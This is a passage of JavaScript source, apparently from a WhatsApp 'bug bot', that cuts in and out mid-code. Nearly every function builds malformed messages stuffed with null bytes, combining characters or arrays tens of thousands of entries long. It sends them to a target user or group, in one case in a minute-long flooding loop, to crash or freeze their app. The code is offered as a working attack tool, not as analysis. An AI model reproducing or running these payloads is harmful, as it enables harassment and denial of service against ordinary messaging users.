        fileLength: "3557776",
        seconds: 19,
        mediaKey: "QOhY9TSI4bfSBp0Bzj80QyW5EYJ6OQL4Ak3pjb1vUMM=",
        height: 480,
        width: 480,
        fileEncSha256: "g7ZxEPo0YUaHnEYkFfu8BvMh6g4Ib/Y7IzkJFEdZyW0=",
        directPath: "/v/t62.7161-24/706703788_1346924573971315_1414158698537555666_n.enc?ccb=11-4&oh=01_Q5Aa4gENOH7knwbjrwHfiP8lJmjeM-Ue-ZVbQJVaVt8p8_OMvQ&oe=6A3D0F90&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1779806852",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAABBQEAAAAAAAAAAAAAAAAAAQIDBAUGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAyljXsWcs6SHnV187CNqPOaKTLlsSMLm5znQzZrVqqY+c2+fqriMG7WzmumbuW5oSzka2RLJlddB0tzIDC/Lkvpuuzsi5yrr8tr4iu+zSk7QCEtOgctXzBRK9cKZsodMwDmb/xAAqEAACAgIBAwEIAwEAAAAAAAABAgADBBESISIxQQUQEzJRYXFyFBUjUv/aAAgBAQABPwBah2AHyu4UIXlFqVgDv0hx+zkYKmJYD0nwW0p35iU9xDQVNsiGp+Ji2ntP0GozdugOk9m0/HbTeBL/AGcjdEcifwL6w2tNHrtQAPWeka5/xBd27I7tw3kKCPMrVDUp49d6gp2T11PZKBC3WCMUgCWfeZOHjlGYoJqvR6S8IF7Zj4WU1KlU6GHBzvRJhC/Gv42KRN7ENYaW5dWKwQzMzkej/Mzmw3HYsswzrFo/WGMuwSQDDfYjgfMCY9/DXMamUitkByCymf1r2hmB4j0Eet62KspBmtI0x7QKcf8AWZWWETYgzLLU7FJnwSnDl5MekFQzHosbKWq3cqvruXaP+ZmpTbSeeg3pG6K0qyuxB9BEsW26sOem499dY7dCPkcrVPoDMm7VQ6bU+Zf3WEgECVWvUwKmWX2WNyc7Mb5WieBOWvED2MNlvEoWy5WYAaWZFhqq7bPPpGZnO2PuBjghTBivwU+diGhxrpHQrX9pTZwxbhvzAA9Tf9CFWHke6sgHZjMvB/vP/8QAIxEAAgICAQIHAAAAAAAAAAAAAQIAEQMhEgQxEBMiMkFRcf/aAAgBAgEBPwBSwAjOQauByZbzLdi5evdHG/BLq7mXXGcTGtVu4uRiF9MViNTN3E4jj3mYGigH7OlVtmrrU4/JmYglZ5rXEJNkxHKlR9wiwRMooif/xAAeEQACAwABBQAAAAAAAAAAAAAAAQIQERIDITJRkf/aAAgBAwEBPwASMpUqYqlqzPZ1JuMkkqRpJyfiSXc0RwXFs4qKRm/BkVh//9k=",
        contextInfo: {
          pairedMediaType: 4,
          statusSourceType: 0
        },
        annotations: Array.from({ length: 70000 }, () => (
          {
            shouldSkipConfirmation: true,
            embeddedContent: {
              embeddedMusic: {
                author: "\0"
              }
            },
            embeddedAction: true
          }
        )),
        streamingSidecar: "MDcl6QckPwTKM0jEIiaPbRaSSbDMmA7O1wkWQkvHDYRBmhmYe9jxEwk662ZOB0jXrPTvvLE24YQDyHu8zHLq6wz3ithLB2EmFYk+jLqBMAzo4BgZEqLJWMGndenNtdS4H582vlYolVbg9bqUwFm7be2Da/7GxjMrQKP6Ly5f0opOnH0PV+aNPbp2KE9T/hhsMJXscHbg9nxILoRYAWyQV8u72z6fnBwe5PtZrXU48kgwNMFkQRyEvdESdTHxIH/+MntMQ6MFA/G7beOb86iHeADITkXWENvib/bKKd9I09y4Z1Jf+Z9RMnuMq0DePvTXAs3rq2amO94EYtxc9D7TNu1bEYIH8sAtEkjlemYv0nccM54G5KBZF4Li/eywEq5+ri2NVV+6gw2WT6NGrUQ23aGKhyk2d9xeRhxlOeHpDEp1MzFsqrM7bm3k6IQ86YlBoZZrf//IlwMxR8GLaBTPLsGrrVSgF+g0E/HNOkiHxtLB5FxZ04oFOkqD54D9c2+PsoLaHEL0n6SUkh2R4ntE6s3mi6CgNWnWva4K2q61kB9yPg6tsxI26JdxC0fUrVScBXNEmXTZFweTPIgMi3k3eZRkW3I/6ePeRz8pZhzDHo7flhHXxlYfy8hezzpGniX+8VgxUWbflPqJBKTvQ5lJDJxOdgKf/tIotDEws3UcEY3nBumVENqXBudHgL+HimM6bD0187E3IB7OwvsR78IYzh0K7l7Xtw=="
      }
    }, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });
    console.log(chalk.blue("𝗦𝗬𝗦𝗧𝗘𝗠 𝗕𝗨𝗚 𝗥𝗨𝗡!"));
  }
}

async function delayr(devtrust, target) {
  const xdy = {
    key: {
      remoteJid: "status@broadcast",
      participant: "13135550002@bot",
      fromMe: false
    },
    message: {
      conversation: "\0".repeat(300000)
    }
  };

  const msg = await generateWAMessageFromContent(
    target,
    {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
        fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
        mimetype: "image/webp",
        directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
        fileLength: "10610",
        mediaKeyTimestamp: "1775044724",
        stickerSentTs: "1775044724091",
        contextInfo: {
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 3000 }, () => ({
              "\0": "\0"
            }))
          }
        }
      }
    },
    { quoted: xdy }
  );

  await devtrust.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: msg.message
      }
    },
    {
      participant: { jid: target },
      messageId: msg.key.id
    }
  );
      console.log(chalk.blue("𝗦𝗬𝗦𝗧𝗘𝗠 𝗕𝗨𝗚 𝗥𝗨𝗡!"));
}

async function groupB(devtrust, targetJid) {
    if (!targetJid || !targetJid.endsWith("@g.us")) {
        throw new Error("Target harus berformat @g.us");
    }

    try {
        await devtrust.groupParticipantsUpdate(
            targetJid,
            ['18188880008@s.whatsapp.net'],
            'add',
        );

        await devtrust.sendPresenceUpdate('composing', targetJid);

        console.log(`✅ Group ban success: ${targetJid}`);
        return true;

    } catch (e) {
        console.log(`❌ Group ban failed: ${e.message}`);
        throw e;
    }
}

async function randro(target) {
  const msg = await generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
    }
  }, { userJid: target });

  await devtrust.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
      console.log(chalk.blue("𝗦𝗬𝗦𝗧𝗘𝗠 𝗕𝗨𝗚 𝗥𝗨𝗡!"));
}

async function rajufcnew(target) {
  await devtrust.relayMessage(target, {
    interactiveMessage: {
      header: {
        title: "0",
        subtitle: "0",
        hasMediaAttachment: true,
        locationMessage: {
          degreesLatitude: -6.200000,
          degreesLongitude: 106.816666,
          name: "🐉𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚🐉",
          address: "𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑",
          jpegThumbnail: Buffer.alloc(10000, 'a').toString('base64'),
        },
      },
      body: {
        text: "𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑",
      },
      footer: {
        text: "#𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑",
      },
      contextInfo: {
        mentionedJid: target,
        isForwarded: true,
        externalAdReply: {
          title: "𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑",
          body: "𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑",
          thumbnailUrl: "https://i.imgur.com/xxx.jpg",
          sourceUrl: "https://RX7K2-í.dev" + "𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑",
          mediaType: 1,
          renderLargerThumbnail: true,
        },
        forwardedNewsletterMessageInfo: {
          newsletterName: "𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑",
          newsletterJid: "120363344594934051@newsletter",
          serverMessageId: 143,
        },
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net",
        },
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: 'catalog_message',
            buttonParamsJson: JSON.stringify({}),
          },
          {
            name: 'booking_status',
            buttonParamsJson: JSON.stringify({}),
          },
          {
            name: 'review_and_pay',
            buttonParamsJson: {}
          },
          {
            name: 'payment_requested',
            buttonParamsJson: {}
          },
        ],
        messageParamsJson: '{}',
      },
    },
  }, {
    additionalNodes: [
      {
        tag: 'biz',
        attrs: {
          native_flow_name: 'catalog_message',
        },
      },
    ],
    participant: { jid: target }
  });
}

async function CV16(devtrust, target) {
  for (let i = 0; i < 1; i++) {
    const cards = [];
    for (let v = 0; v < 5; v++) {
      cards.push({
        body: { text: "\n".repeat(10) + "ꦾ".repeat(5000) },
        footer: { text: "\n".repeat(10) },
        header: {
          title: "©",
          hasMediaAttachment: true,
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            fileLength: "5991",
            height: 0,
            width: 0,
            mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1721344123",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            scansSidecar: "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            scanLengths: [247, 201, 73, 63],
            midQualityFileSha256: "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        nativeFlowMessage: {
          buttons: [
            { name: "single_select", buttonParamsJson: JSON.stringify({ display_text: "ោ៝".repeat(5000), id: null }) },
            { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦾ".repeat(10000), id: null }) },
            { name: "review_and_pay", buttonParamsJson: JSON.stringify({ display_text: "ꦾ".repeat(10000) }) },
            { name: "galaxy_message", buttonParamsJson: JSON.stringify({ flow_action: "navigate", flow_action_payload: { screen: "WELCOME_SCREEN" }, flow_cta: "ꦾ".repeat(10000), flow_id: "yeah, i know, i'm not perfect...", flow_message_version: "9", flow_token: "ПӨΣƧZYЦI! —" }) }
          ], 
contextInfo: { isForwarded: true, forwardingScore: 999 }
        }
      });
    }

    const carouselMsg = generateWAMessageFromContent(target, {
      interactiveMessage: {
        header: { hasMediaAttachment: false },
        body: { text: "ꦾ".repeat(26000) },
        footer: { text: "ꦾ".repeat(5000) },
        carouselMessage: { cards: cards },
        contextInfo: { stanzaId: null, quotedMessage: { conversation: "ꦾ".repeat(15000) }, remoteJid: "status@broadcast", mentionedJid: ["0@s.whatsapp.net"] }
      }
    }, { userJid: target, quoted: null });

    await devtrust.relayMessage(target, carouselMsg.message, {
      messageId: carouselMsg.key.id,
      participant: { jid: target }
    });
await new Promise(i => setTimeout(i, 750));
  }
}

async function crashdelayjirwow(devtrust, target) {
    const rezzonly6 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "𝐆𝐀𝐁𝐔𝐓 𝐀𝐍𝐉𝐈𝐍𝐆"
                    },
                    nativeFlowMessage: {
                        buttons: "\u200B" + "\n".repeat(25000)
                    }
                }
            }
        }
    };

    const rezzonly7 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "🦠ꄲ꒒ꋬꋬ RAJU",
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };
        await devtrust.relayMessage(target, rezzonly6, {});
        await devtrust.relayMessage(target, rezzonly7, {});
    }

async function rjhome(target, devtrust) {
  try {
    const message = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: '33333333333333333@newsletter',
            newsletterName: "uwu" + "ྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃ".repeat(1999),
            jpegThumbnail: "",
            caption: "ྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃ".repeat(1999),
            inviteExpiration: Date.now() + 1814400000,
          },
        },
      },
    };
    
    await devtrust.relayMessage(target, message, {
      userJid: target,
    });
    
  } catch (erro) {
    console.log('Erro:', erro);
  }
}

async function rajuinvdelay2(devtrust, target) {
    await devtrust.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
      interactiveResponseMessage: {
        body: {
          text: "RAJU X HERE",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "call_permission_request",
          paramsJson: "",
          version: 3
        },
        contextInfo: {
          remoteJid: target,
          isForwarded: true,
          forwardingScore: 9999,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 99999 }, (_, n) => ({
              participant: `62${n + 888888}@s.whatsapp.net`
            }))
          },
        },
      },
    },
  },
}, { participant: { jid: target }});

await devtrust.relayMessage(
    target,
    {
  groupStatusMessageV2: { 
    message: {
      interactiveResponseMessage: {
        body: {
          text: "RAJU X HERE",
          format: "DEFAULT",
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"+9999999999\",\"building_name\":\"ampos\",\"address\":\"/MakLo\",\"tower_number\":\"987\",\"city\":\"MakLo\",\"name\":\"CRB\",\"phone_number\":\"+888888888888\",\"house_number\":\"99\",\"floor_number\":\"99\",\"state\":\"${"\u0000".repeat(5000)}\"}}`,
          version: 3
          },
          contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(9000),
          isForwarded: true,
          forwardingScore: 9999,
          statusAttributionType: 2,
            statusAttributions: Array.from({ length: 99999 }, (_, n) => ({
              participant: `62${n + 888888}@s.whatsapp.net`,
              type: 1
            })),
        },
      },
    },
  },
}, { participant: { jid: target } }, );
console.log(chalk.blue("𝗦𝗬𝗦𝗧𝗘𝗠 𝗕𝗨𝗚 𝗥𝗨𝗡!"));
}

async function isinvisr(devtrust, target) {
  await devtrust.relayMessage("status@broadcast", {
    groupStatusMessageV2: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
          fileLength: "289511",
          seconds: 15,
          mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
          caption: "\n",
          height: 640,
          width: 640,
          fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
          directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1743848703",
          contextInfo: {},
          nativeFlowMessage: {
            name: "galaxy_message",
            buttonParamsJson: "\u0000".repeat(999999)
          }
        }
      }
    }
  }, { participant: { jid: target } });
console.log(chalk.blue("𝗦𝗬𝗦𝗧𝗘𝗠 𝗕𝗨𝗚 𝗥𝗨𝗡!"));
}

async function isblankr(devtrust, target) {
  await devtrust.relayMessage("status@broadcast", {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: "289511",
      seconds: 15,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "\n",
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1743848703",
      contextInfo: {},
      nativeFlowMessage: {
        name: "galaxy_message",
        buttonParamsJson: "\u0000".repeat(999999)
      }
    }
  }, { participant: { jid: target } });
  console.log(chalk.blue("𝗦𝗬𝗦𝗧𝗘𝗠 𝗕𝗨𝗚 𝗥𝗨𝗡!"));
}

async function rinvis(devtrust, target) {
  const Zxc = {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [{
          name: "payment_info",
          buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${"\u0000".repeat(7500)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"${"\u0000".repeat(7500)}","key_type":"CPF"}}],"share_payment_status":false}`
        }]
      }
    }
  };

  const Xyber = {
    viewOnceMessage: {
      message: {
        videoMessage: {
          mimetype: "video/mp4",
          fileLength: "17381601",
          title: "RAJU ",
          fileName: `done bos ${"ꦽ".repeat(75000)}`,
          fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
          fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
          mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
          directPath: "/v/t62.7119-24/fake.enc",
          mediaKeyTimestamp: "1767975195",
          url: "https://mmg.whatsapp.net/d/fake.enc",
          caption: `${"ꦾ".repeat(7000)}${"ꦽ".repeat(7500)}`
        }
      }
    }
  };

  const Muda = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: `R${"ꦾ".repeat(7500)}`
          },
          contextInfo: {
            stanzaId: "metawai_id",
            forwardingScore: 999,
            participant: target,
            mentionedJid: Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
          }
        }
      }
    }
  };

  const stickers = {
    stickerMessage: {
      url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
      fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
      fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
      mediaKey: Buffer.alloc(32, '').toString('base64'),
      mimetype: "image/webp",
      height: -1,
      width: 5000,
      directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
      fileLength: null,
      mediaKeyTimestamp: 1710000000,
      firstFrameLength: 999,
      firstFrameSidecar: Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
      isAnimated: false,
      pngThumbnail: Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1999 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
        ],
        interactiveAnnotations: [{
          polygonVertices: [
            { x: 0.1, y: 0.1 },
            { x: 0.9, y: 0.1 },
            { x: 0.9, y: 0.9 },
            { x: 0.1, y: 0.9 }
          ],
          location: {
            latitude: -6.2088,
            longitude: 106.8456,
            name: "RAJU"
          }
        }]
      },
      stickerSentTs: 1710000000,
      isAvatar: true,
      isAiSticker: true,
      isLottie: true,
      accessibilityLabel: "\u0000".repeat(9000),
      mediaKeyDomain: null
    }
  };

  await devtrust.relayMessage("status@broadcast", Xyber, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });

  await devtrust.relayMessage("status@broadcast", Muda, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });

  const startTime = Date.now();
  const duration = 1 * 60 * 1000;
  while (Date.now() - startTime < duration) {
    await devtrust.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          extendedTextMessage: {
            text: "\u0000".repeat(75000),
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
              ]
            }
          }
        }
      }
    }, { participant: { jid: target } });
  }

  const interactiveResponMessage = {
    contextInfo: {
      forwardingScore: null,
      isForwarded: false,
      fromMe: true,
      participant: "0@s.whatsapp.net",
      mentionJid: usr
    },
    body: {
      text: "RAJU¿!",
      format: "DEFAULT"
    },
    nativeFlowResponseMessage: {
      name: "RAJU¿!",
      paramsJson: x,
      version: 3
    }
  };
  await devtrust.relayMessage(target, { interactiveResponMessage }, { participant: { jid: target } });

  const view0nceMessageV2 = {
    message: {
      interactiveMessage: {
        locationMessage: {
          degreesLatitude: 9999999999,
          degreesLongitude: 9999999999
        },
        body: {
          text: "RAJU¿!"
        },
        nativeFlowMessage: {
          buttons: "\u0000".repeat(10000)
        }
      }
    }
  };
  await devtrust.relayMessage(target, { viewOnceMessageV2: view0nceMessageV2 }, { participant: { jid: target } });
}

async function Rajufcrich(devtrust, target) {
  try {
    await devtrust.relayMessage(target, {
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: [
              {
                messageType: 8,
                latexMetadata: {
                  text: "RAJU Here"
                }
              },
              {
                messageType: 4,
                tableMetadata: {
                  title: "\0",
                  rows: [
                    {
                      items: [],
                      isHeading: false
                    }
                  ]
                }
              }
            ],
            contextInfo: {
              forwardingScore: 99999,
              isForwarded: true,
              forwardedAiBotMessageInfo: {
                botJid: "867051314767696@bot"
              },
              forwardOrigin: 4
            }
          }
        }
      }
    }, {});
  } catch (e) {
    console.log(e);
  }
}

async function rajublank(devtrust, target) {
  await devtrust.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "Blank-Xstorng"
      },
      nativeFlowMessage: {
        name: "voice_call",
        buttonParamsJson: "\0000".repeat(99999999)
      }
    }
  }, { participant: { jid: target }  });
  console.log(chalk.blue("𝗦𝗬𝗦𝗧𝗘𝗠 𝗕𝗨𝗚 𝗥𝗨𝗡!"));
}

async function riphone(target) {
  await devtrust.relayMessage(target, {
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: "AI_RICH_RESPONSE_TYPE_STANDARD",
          submessages: [],
          unifiedResponse: {
            data: Buffer.from(JSON.stringify({
              response_id: crypto.randomUUID(),
              sections: [
                {
                  view_model: {
                    primitive: {
                      text: "RAJU",
                      inline_entities: ["𑇂𑆵𑆴𑆿".repeat(60000)],
                      __typename: "GenAIMarkdownTextUXPrimitive",
                    },
                    __typename: "GenAISingleLayoutViewModel",
                  }
                }
              ]
            }))
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardOrigin: 4
          }
        }
      }
    }
  }, {
    participant: { jid: target }
  });
}

async function iosraajuuu(devtrust, target) {
    await devtrust.relayMessage(target, {
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: [],
            unifiedResponse: {
              data: Buffer.from(JSON.stringify({
                response_id: crypto.randomUUID(),
                sections: [
                  {
                    view_model: {
                      primitive: {
                        text: "x",
                        inline_entities: ["{".repeat(3000)],
                        __typename: "GenAIMarkdownTextUXPrimitive",
                        },
                      __typename: "GenAISingleLayoutViewModel",
                    }
                  }
                ]
              }))
            },
            contextInfo: {
              forwardingScore: 1,
              isForwarded: true,
              forwardOrigin: 4,
              forwardedAiBotMessageInfo: {
                botJid: "0@bot"
              }
            }
          }
        }
      }
    }, {
      isSecret: true,
    })
    await sleep(1000);
  }

async function crashandrowoyyy(devtrust, target) {
  const bomb = "\u0000".repeat(80000) + "𑇂𑆵𑆴𑆿".repeat(80000) + "ꦾ".repeat(80000) + "]".repeat(80000) + "[".repeat(80000);
  const opts = Array.from({ length: 10000 }, (_, i) => ({
    optionName: "🍷⃟༑ Hi You Know RAJU?ⲣⲙꦽ🦠" + i + bomb.slice(0, 500),
    optionHash: "¡m ⟅༑ ‌‌‌E‌x‌f‌o‌l‌d‌ H‌y‌b‌r‌i‌d ♞" + i + bomb.slice(0, 500)
  }));

  const payload = {
    pollCreationMessageV6: {
      name: bomb.slice(0, 10000),
      options: opts,
      selectableOptionsCount: 1,
      pollType: 0,
      pollContentType: 2,
      hideParticipantName: true,
      allowAddOption: false,
      endTime: 999999999999999999
    }
  };

  await devtrust.relayMessage(target, payload, {});

  const tags = [
    [0xBA, 0x03],
    [0xD2, 0x04],
    [0xAA, 0x02],
  ];

  await devtrust.sendMessage('status@broadcast', {
    status: bomb.slice(0, 4000),
    contextInfo: {
      mentionedJid: Array.from({ length: 3000 }, (_, i) => i + 62 + "@s.whatsapp.net"),
      isForwarded: true,
      forwardingScore: 999999,
      tags: tags
    }
  }, {});
}

async function rajuvisible(devtrust, target) {
  const Squid = { 
